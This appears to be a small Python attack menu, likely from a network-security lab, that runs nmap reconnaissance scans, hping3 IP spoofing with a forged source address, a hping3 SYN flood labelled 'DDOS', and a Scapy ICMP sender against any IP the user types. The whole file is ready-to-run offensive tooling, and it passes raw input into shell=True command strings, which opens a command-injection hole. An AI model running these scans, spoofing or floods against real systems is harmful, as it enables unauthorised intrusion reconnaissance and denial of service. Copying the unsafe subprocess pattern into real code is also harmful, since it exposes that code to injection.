
import os
import logging
import subprocess

from scapy.all import *

def icmp_scapy():
    
    ip_layer = IP(dst='10.0.0.2')
    icmp_layer = ICMP()
    packet = ip_layer / icmp_layer
    send(packet)
    print("Packet Sent")

while True:
    attack = int(input('Choose Attack:  '))
    ip = str(input("What is the IP of the Target:  "))
 
    if attack == 1:
        print("SYN Scan")
        subprocess.call(f"nmap -p 22 -sS {ip}", shell=True)
        subprocess.call(["ls", "-l"])
    elif attack == 2:
        print("Fin Scan")
        subprocess.call(f"nmap -sF -p 80 {ip}", shell=True)
    elif attack == 3:
        print("TCP Connect")
        subprocess.call(f"nmap {ip} -p 22 -sT", shell=True)
    elif attack == 4:
        print("XMAS Port Scan")
        subprocess.call(f"nmap -sX -p 80 {ip}", shell=True)
    elif attack == 5:
        print("NULL Port Scan")
        subprocess.call(f"nmap -sN -p 80 {ip}", shell=True)
    elif attack == 6:
        print("ACK Port Scan")
        subprocess.call(f"nmap -p 22 -sA {ip}", shell=True)
    elif attack == 7:
        print("Idle Port Scan")
        # subprocess.call("nmap -p 22 -sA 10.0.0.2", shell=True)
    elif attack == 8:
        print("UDP Port Scan")
        subprocess.call(f"nmap -sU {ip} -p 138", shell=True)
    elif attack == 9:
        print("Active OS Fingerprinting")
        subprocess.call(f"nmap -p 80 -O {ip}", shell=True)
    elif attack == 10:
        print("IP Spoofing")
        subprocess.call(f"hping3 -S {ip} -a 192.168.20.5 -c 3 ", shell=True)
    elif attack == 12:
        print("DDOS: Syn Floods")
        subprocess.call(f"hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood {ip} ", shell=True)
    elif attack == 13:
        print("NMAP ICMP Ping")
        subprocess.call(f"ping {ip} -s 0 " , shell=True)
    elif attack == 14:
        print("ICMP Scapy")
        icmp_scapy()
    else:
        print("Blyat!@#")
        

